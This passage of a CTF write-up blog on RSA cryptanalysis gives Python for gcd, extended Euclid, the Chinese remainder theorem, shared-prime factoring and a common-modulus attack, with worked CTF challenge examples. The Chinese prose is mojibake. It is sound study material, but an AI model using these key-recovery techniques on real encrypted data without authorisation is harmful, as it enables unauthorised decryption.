n)ÔºåÂÖ∂‰∏≠bÊ®°nÁöÑÈÄÜËÆ∞‰ΩúbÁöÑË¥ü‰∏ÄÊ¨°Êñπ„ÄÇ</span><br><span class="line"></span><br><span class="line">Ë¥πÈ©¨Â∞èÂÆöÁêÜ:</span><br><span class="line">aÊòØÊï¥Êï∞,pÊòØË¥®Êï∞,Âàôa^p==a(mod p),Â¶ÇÊûúa‰∏çÊòØpÁöÑÂÄçÊï∞,ËøòÊúâa^(p<span class="number">-1</span>) ‚â° <span class="number">1</span>(mod p)</span><br></pre></td></tr></table></figure><p>Êé®ËçêÊñáÁ´† <a href="https://blog.sengxian.com/algorithms/mod-world" target="_blank" rel="noopener">Ê®°ËøêÁÆóÊÄªÁªì</a> Âíå <a href="https://github.com/wujr5/algorithm-analysis-and-design/blob/master/relative-algorithm-learning/6-algorithm-about-modulo-operation.md" target="_blank" rel="noopener">ÂèñÊ®°ËøêÁÆóÊ∂âÂèäÁöÑÁÆóÊ≥ï</a> „ÄÇ</p><h2 id="Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ï"><a href="#Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ï" class="headerlink" title="Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ï"></a>Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ï</h2><p>Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÊòØÊ±ÇÊúÄÂ§ßÂÖ¨Á∫¶Êï∞ÁöÑÁÆóÊ≥ï, ‰πüÂ∞±ÊòØ‰∏≠Â≠¶Â≠¶ÁöÑ <a href="https://zh.wikipedia.org/wiki/%E8%BC%BE%E8%BD%89%E7%9B%B8%E9%99%A4%E6%B3%95" target="_blank" rel="noopener">ËæóËΩ¨Áõ∏Èô§Ê≥ï</a> „ÄÇËÆ∞ <code>gcd(a,b)</code> ‰∏∫aÂíåbÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞ÔºåÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÁöÑÂü∫Êú¨ÂéüÁêÜÊòØ<code>gcd(a,b)==gcd(b,a%b),(b!=0)</code>  Âíå <code>gcd(a,0)==a</code> „ÄÇ</p><p>PythonÂÆûÁé∞Â¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÈÄíÂΩíÁâà</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> a <span class="keyword">if</span> <span class="keyword">not</span> b <span class="keyword">else</span> gcd(b, a % b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ëø≠‰ª£Áâà</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></figure><h2 id="Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï"><a href="#Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï" class="headerlink" title="Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï"></a>Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï</h2><p>Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÂü∫‰∫éÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÔºåËÉΩÂ§üÊ±ÇÂá∫‰ΩøÂæó <code>ax+by=gcd(a,b)</code> ÁöÑ‰∏ÄÁªÑx,y„ÄÇ</p><p><a href="http://blog.miskcoo.com/2014/09/chinese-remainder-theorem#i-3" target="_blank" rel="noopener">ËøôÁØáÊñáÁ´†</a> Ëß£ÈáäÂæóÂæàÂà∞‰ΩçÔºåÂØπÁÖß‰∏ãÂõæÂíå‰ª•‰∏ãÈÄíÂΩíÁâàÂÆûÁé∞ÂÆπÊòìÁêÜËß£„ÄÇ</p><p><img src="1531578488892.png" alt="ext_euclid"></p><p>PythonÂÆûÁé∞Â¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ÈÄíÂΩíÁâà</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ext_euclid</span> <span class="params">( a , b )</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://zh.wikipedia.org/wiki/Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x1 , y1 , q = ext_euclid( b , a % b ) <span class="comment"># q = GCD(a, b) = GCD(b, a%b)</span></span><br><span class="line">        x , y = y1, ( x1 - (a // b) * y1 )</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"><span class="comment"># Ëø≠‰ª£Áâà</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="comment"># ref:https://blog.csdn.net/wyf12138/article/details/60476773</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>, <span class="number">0</span>, a)</span><br><span class="line">    x, y = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    s1, s2 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">while</span> r:</span><br><span class="line">        m, n = x, y</span><br><span class="line">        x = s1 - x * q</span><br><span class="line">        y = s2 - y * q</span><br><span class="line">        s1, s2 = m, n</span><br><span class="line">        a, b = b, r</span><br><span class="line">        r, q = a % b, a / b</span><br><span class="line">    <span class="keyword">return</span> (x, y, b)</span><br></pre></td></tr></table></figure><h2 id="‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ"><a href="#‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ" class="headerlink" title="‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ"></a>‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜ</h2><p><a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E5%9B%BD%E5%89%A9%E4%BD%99%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">Áª¥Âü∫ÁôæÁßë</a> ÁªôÂá∫‰∫ÜÁÆÄÊ¥ÅÁîüÂä®ÁöÑËØ¥Êòé:</p><p><img src="1531585006464.png" alt="CRT"></p><p>ÂèÇËÄÉ‰ª•‰∏äËØ¥ÊòéËøõË°åÁöÑPythonÂÆûÁé∞:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,aiÂàÜÂà´Ë°®Á§∫Ê®°Êï∞ÂíåÂèñÊ®°ÂêéÁöÑÂÄº,ÈÉΩ‰∏∫ÂàóË°®ÁªìÊûÑ</span></span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    <span class="comment"># lcm=lambda x , y:x*y/gcd(x,y)</span></span><br><span class="line">    <span class="comment"># mul=lambda x , y:x*y</span></span><br><span class="line">    <span class="comment"># assert(reduce(mul,mi)==reduce(lcm,mi))</span></span><br><span class="line">    <span class="comment"># ‰ª•‰∏äÂèØÁî®‰∫é‰øùËØÅmi‰∏§‰∏§‰∫íË¥®</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br></pre></td></tr></table></figure><p>‰ª•‰∏äÁ®ãÂ∫èÂ∞ÜmiÂΩì‰Ωú‰∏§‰∏§‰∫íË¥®Â§ÑÁêÜ,ÂÆûÈôÖ‰∏äÊúâÊó∂‰ºöÈÅáÂà∞ÂÖ∂‰ªñÊÉÖÂÜµÔºåËøôÊó∂Â∞±ÈúÄË¶ÅÈÄê‰∏Ä‰∏§‰∏§ÂêàÂπ∂ÊñπÁ®ãÁªÑ„ÄÇÊàëÂèÇÁÖß‰∏ãÂõæÂÆûÁé∞‰∫Ü‰∏Ä‰∏™‰∫íË¥®‰∏é‰∏ç‰∫íË¥®‰∏§ÁßçÊÉÖÂÜµ‰∏ãÈÉΩËÉΩÂ∑•‰ΩúËâØÂ•ΩÁöÑ‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÔºàËß£Âêå‰ΩôÊñπÁ®ãÁªÑÔºâÁöÑPythonÁ®ãÂ∫è„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="comment"># mi,aiÂàÜÂà´Ë°®Á§∫Ê®°Êï∞ÂíåÂèñÊ®°ÂêéÁöÑÂÄº,ÈÉΩ‰∏∫ÂàóË°®ÁªìÊûÑ</span></span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#‰∏çÊàêÁ´ãÂàô‰∏çÂ≠òÂú®Ëß£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">        cura %= curm</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(Ëß£,ÊúÄÂ∞èÂÖ¨ÂÄçÊï∞)</span></span><br></pre></td></tr></table></figure><p>ÂõæÁâáÊà™Ëá™  <a href="https://blog.csdn.net/qq_29980371/article/details/71053219" target="_blank" rel="noopener">‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÔºà‰∫íË¥®‰∏é‰∏ç‰∫íË¥®ÁöÑÊÉÖÂÜµÔºâ</a> „ÄÇ</p><p><img src="1531591884497.png" alt="CRT2"></p><h1 id="Â∏∏ËßÅÊîªÂáªÊñπÂºèÂÆûË∑µ"><a href="#Â∏∏ËßÅÊîªÂáªÊñπÂºèÂÆûË∑µ" class="headerlink" title="Â∏∏ËßÅÊîªÂáªÊñπÂºèÂÆûË∑µ"></a>Â∏∏ËßÅÊîªÂáªÊñπÂºèÂÆûË∑µ</h1><h2 id="ÂáÜÂ§áÂ∑•ÂÖ∑"><a href="#ÂáÜÂ§áÂ∑•ÂÖ∑" class="headerlink" title="ÂáÜÂ§áÂ∑•ÂÖ∑"></a>ÂáÜÂ§áÂ∑•ÂÖ∑</h2><ul><li>python<ul><li>gmpy2Â∫ì<ul><li>WindowsÔºöÂèØ‰ªé<a href="https://pypi.org/project/gmpy2/#files" target="_blank" rel="noopener">https://pypi.org/project/gmpy2/#files</a> Áõ¥Êé•‰∏ãËΩΩÂ∑≤ÁºñËØëÁöÑÂÆâË£ÖÂåÖ„ÄÇ</li><li>LinuxÔºö  <code>sudo apt install python-gmpy2</code> </li></ul></li><li>libnumÂ∫ìÔºö<ul><li><code>git clone https://github.com/hellman/libnum.git &amp;&amp; cd libnum &amp;&amp; python setup.py install</code> </li></ul></li></ul></li><li>yafu<ul><li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a> </li></ul></li><li>RSATool2v17.exe</li></ul><h2 id="RSAËß£ÂØÜ"><a href="#RSAËß£ÂØÜ" class="headerlink" title="RSAËß£ÂØÜ"></a>RSAËß£ÂØÜ</h2><p>Ëã•Â∑≤Áü•ÁßÅÈí•dÔºåÂàôÂèØ‰ª•Áõ¥Êé•Ëß£ÂØÜÔºö <code>m=pow(c,d,n)</code> „ÄÇ</p><p>Ëã•Â∑≤Áü•Ë¥®Êï∞pÂíåqÔºåÂàôÈÄöËøá‰æùÊ¨°ËÆ°ÁÆóÊ¨ßÊãâÂáΩÊï∞ÂÄºphi„ÄÅÁßÅÈí•dÂèØËß£ÂØÜ„ÄÇÁÆÄÊòìÂÆûÁé∞Â¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rsa_decrypt</span><span class="params">(e, c, p, q)</span>:</span></span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = gmpy2.invert(e, phi) <span class="comment">#Ê±ÇeÊ®°phiÁöÑÈÄÜ</span></span><br><span class="line">        <span class="keyword">return</span> pow(c, d, n)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"e and phi are not coprime!"</span></span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure><p>Âú®ÈÄâÂèñÂä†ÂØÜÊåáÊï∞eÊó∂Ë¶ÅÊ±ÇphiÔºåe‰∫íË¥®Ôºå‰πüÂ∞±ÊòØ<code>gcd(phi,e)==1</code> ÔºåÂ¶ÇÊûú‰∏çÊª°Ë∂≥ÊòØÊó†Ê≥ïÁõ¥Êé•Ëß£ÂØÜÁöÑ„ÄÇ</p><p>‰∏∫‰ªÄ‰πàËØ¥Ëøô‰∏™Âë¢ÔºüÊòØÂõ†‰∏∫ÊúâÊó∂‰ºöÊúâ‰πç‰∏ÄÁúãÊúâÁÇπÂ•áÊÄ™ÁöÑÊÉÖÂÜµ„ÄÇÊØîÂ¶ÇSCTF2018ÁöÑ<code>Crypto - a number problem</code> ÔºåÈ¢òÁõÆÊòØ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x**<span class="number">33</span>=<span class="number">1926041757553905692219721422025224638913707</span> mod <span class="number">3436415358139016629092568198745009225773259</span></span><br><span class="line">tell me the smallest answer of x</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠<code>n=3436415358139016629092568198745009225773259</code> ÂèØ‰ª•Áõ¥Êé•ÂàÜËß£ÂæóÂà∞p,qÔºåÂá∫<code>phi=(p-1)*(q-1)</code> ÔºåÁÑ∂ÂêéÊÉäÂ•áÂú∞ÂèëÁé∞<code>gcd(phi,33)==3</code> „ÄÇËøôÊó∂Â¶ÇÊûúÂØπÂä†ÂØÜËøáÁ®ãÊØîËæÉÁÜüÊÇâÁöÑËØùÔºåÂ∞±ÂèØ‰ª•ÊÉ≥Âà∞ÂÆûÈôÖ‰∏äÂÖ¨Èí•<code>e=11</code> ÔºåÊòéÊñáÊòØ<code>m=x^3</code> ÔºåÂ∫îËØ•ÂÖàÊ±ÇÂá∫m„ÄÇÁÑ∂ÂêéÂÜçÁàÜÁ†¥x„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">    <span class="comment"># Êé®Ëçê‰ΩøÁî®gmpy2Â∫ìËøêÁÆóÔºåÁî®powÂºÄÁ´ãÊñπ‰∏çÂèØË°å</span></span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">1</span>]:</span><br><span class="line">        x = gmpy2.iroot(m + i * n, <span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># i==243277,x==9420391510958023</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Êü•ËØ¢Â∑≤Áü•ÁöÑnÁöÑÂèØÂàÜËß£ÊÉÖÂÜµ"><a href="#Êü•ËØ¢Â∑≤Áü•ÁöÑnÁöÑÂèØÂàÜËß£ÊÉÖÂÜµ" class="headerlink" title="Êü•ËØ¢Â∑≤Áü•ÁöÑnÁöÑÂèØÂàÜËß£ÊÉÖÂÜµ"></a>Êü•ËØ¢Â∑≤Áü•ÁöÑnÁöÑÂèØÂàÜËß£ÊÉÖÂÜµ</h2><p>Âú®Á∫øÊü•ËØ¢Ôºö<a href="https://factordb.com/" target="_blank" rel="noopener">https://factordb.com/</a> </p><p>apiÊé•Âè£Ôºö</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://factordb.com/api?query=12345</span><br><span class="line">response:</span><br><span class="line">&#123;"id":"12345","status":"FF","factors":[["3",1],["5",1],["823",1]]&#125;</span><br></pre></td></tr></table></figure><h2 id="‰ΩøÁî®yafuÂàÜËß£N"><a href="#‰ΩøÁî®yafuÂàÜËß£N" class="headerlink" title="‰ΩøÁî®yafuÂàÜËß£N"></a>‰ΩøÁî®yafuÂàÜËß£N</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöp,qÁõ∏Â∑ÆËæÉÂ§ßÊàñËæÉÂ∞èÊó∂ÂèØÂø´ÈÄüÂàÜËß£„ÄÇ</strong></p><p>‰ΩøÁî®ÊñπÊ≥ïÔºö<code>yafu-x64.exe factor(233)</code>  Ôºå<code>yafu-x64.exe help</code></p><h2 id="Ê®°‰∏ç‰∫íÁ¥†-Ôºàgcd-N1-N2-1Ôºâ"><a href="#Ê®°‰∏ç‰∫íÁ¥†-Ôºàgcd-N1-N2-1Ôºâ" class="headerlink" title="Ê®°‰∏ç‰∫íÁ¥†    Ôºàgcd(N1,N2)!=1Ôºâ"></a>Ê®°‰∏ç‰∫íÁ¥†    Ôºà<code>gcd(N1,N2)!=1</code>Ôºâ</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÂ≠òÂú®‰∏§‰∏™ÊàñÊõ¥Â§öÊ®°Êï∞ Ôºå‰∏î<code>gcd(N1,N2)!=1</code> „ÄÇ</strong></p><p>Â§ö‰∏™Ê®°Êï∞nÂÖ±Áî®Ë¥®Êï∞ÔºåÂàôÂèØ‰ª•ÂæàÂÆπÊòìÂà©Áî®Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÊ±ÇÂæó‰ªñ‰ª¨ÁöÑË¥®Âõ†Êï∞‰πã‰∏Ä<code>gcd(N1,N2)</code>  ÔºåÁÑ∂ÂêéËøô‰∏™ÊúÄÂ§ßÂÖ¨Á∫¶Êï∞ÂèØÁî®‰∫éÂàÜËß£Ê®°Êï∞ÂàÜÂà´ÂæóÂà∞ÂØπÂ∫îÁöÑpÂíåqÔºåÂç≥ÂèØËøõË°åËß£ÂØÜ„ÄÇÂÆûÁé∞ÂèÇÁÖßÊú¨Êñá<code>Ê¨ßÂá†ÈáåÂæóÁÆóÊ≥ï</code> ÈÉ®ÂàÜÂíå<code>RSAËß£ÂØÜ</code> ÈÉ®ÂàÜ„ÄÇ</p><h2 id="ÂÖ±Ê®°ÊîªÂáª"><a href="#ÂÖ±Ê®°ÊîªÂáª" class="headerlink" title="ÂÖ±Ê®°ÊîªÂáª"></a>ÂÖ±Ê®°ÊîªÂáª</h2><p><strong>ÈÄÇÁî®ÊÉÖÂÜµÔºöÊòéÊñám„ÄÅÊ®°Êï∞nÁõ∏ÂêåÔºåÂÖ¨Èí•ÊåáÊï∞e„ÄÅÂØÜÊñác‰∏çÂêåÔºå<code>gcd(e1,e2)==1</code></strong> </p><p>ÂØπÂêå‰∏ÄÊòéÊñáÁöÑÂ§öÊ¨°Âä†ÂØÜ‰ΩøÁî®Áõ∏ÂêåÁöÑÊ®°Êï∞Âíå‰∏çÂêåÁöÑÂÖ¨Èí•ÊåáÊï∞ÂèØËÉΩÂØºËá¥ÂÖ±Ê®°ÊîªÂáª„ÄÇÁÆÄÂçïËØÅÊòéËßÅ‰ª£Á†ÅÊ≥®Èáä„ÄÇ</p><p>PythonÂÆûÁé∞Ôºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">common_modulus</span><span class="params">(n, e1, e2, c1, c2)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    ref: https://crypto.stackexchange.com/questions/16283/how-to-use-common-modulus-attack</span></span><br><span class="line"><span class="string">    ‚àµgcd(e1,e2)==1,‚à¥Áî±Êâ©Â±ïÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ïÔºåÂ≠òÂú®e1*s1+e2*s2==1</span></span><br><span class="line"><span class="string">    ‚à¥m==m^1==m^(e1*s1+e2*s2)==((m^e1)^s1)*((m^e2)^s2)==(c1^s1)*(c2^s2)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">assert</span> (libnum.gcd(e1, e2) == <span class="number">1</span>)</span><br><span class="line">    _, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="comment"># Ëã•s1&lt;0ÔºåÂàôc1^s1==(c1^-1)^(-s1)ÔºåÂÖ∂‰∏≠c1^-1‰∏∫c1Ê®°nÁöÑÈÄÜÂÖÉ„ÄÇ</span></span><br><span class="line">    m = pow(c1, s1, n) <span class="keyword">if</span> s1 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c1, n), -s1, n)</span><br><span class="line">    m *= pow(c2, s2, n) <span class="keyword">if</span> s2 &gt; <span class="number">0</span> <span class="keyword">else</span> pow(gmpy2.invert(c2, n), -s2, n)</span><br><span class="line">    <span class="keyword">return</span> m % n</span><br></pre></td></tr></table></figure><h3 id="‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ-Xman-RSA-„ÄêÂÖ±Ê®°ÊîªÂáª-Ê®°‰∏ç‰∫íÁ¥†„Äë"><a href="#‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ-Xman-RSA-„ÄêÂÖ±Ê®°ÊîªÂáª-Ê®°‰∏ç‰∫íÁ¥†„Äë" class="headerlink" title="‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ / Xman-RSA „ÄêÂÖ±Ê®°ÊîªÂáª+Ê®°‰∏ç‰∫íÁ¥†„Äë"></a>‰æãÂ≠êÔºöQCTF2018-XManÈÄâÊãîËµõ / Xman-RSA „ÄêÂÖ±Ê®°ÊîªÂáª+Ê®°‰∏ç‰∫íÁ¥†„Äë</h3><p>ËøôÈÅìÈ¢òÂà©Áî®‰∫ÜÂÖ±Ê®°ÊîªÂáªÂíåÊ®°‰∏ç‰∫íÁ¥†„ÄÇÂàöÂºÄÂßãÊòØ‰∏Ä‰∏™Â≠óÁ¨¶ÊõøÊç¢Ôºå‰∏éÊú¨ÊñáÊó†ÂÖ≥„ÄÇencryption.encryptedÊñá‰ª∂Ë¢´ÂÅö‰∫ÜÂ≠óÁ¨¶ÊõøÊç¢ÔºåÊ†πÊçÆËØ≠Ê≥ïÁ°ÆÂÆöÊõøÊç¢Ë°®Ôºå‰øÆÂ§çÊñá‰ª∂ÂæóÂà∞Ê∫êÊñá‰ª∂Â¶Ç‰∏ã„ÄÇ</p><p>È¢òÁõÆÈôÑ‰ª∂ËßÅÊñáÊú´ÈìæÊé•„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> is_prime</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_to_num</span><span class="params">(b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(b.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">num_to_bytes</span><span class="params">(n)</span>:</span></span><br><span class="line">    b = hex(n)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">    b = <span class="string">'0'</span> + b <span class="keyword">if</span> len(b) % <span class="number">2</span> == <span class="number">1</span> <span class="keyword">else</span> b</span><br><span class="line">    <span class="keyword">return</span> b.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_a_prime</span><span class="params">(l)</span>:</span></span><br><span class="line">    random_seed = urandom(l)</span><br><span class="line"></span><br><span class="line">    num = bytes_to_num(random_seed)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> is_prime(num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> num</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(s, e, n)</span>:</span></span><br><span class="line">    p = bytes_to_num(s)</span><br><span class="line">    p = pow(p, e, n)</span><br><span class="line">    <span class="keyword">return</span> num_to_bytes(p).encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">separate</span><span 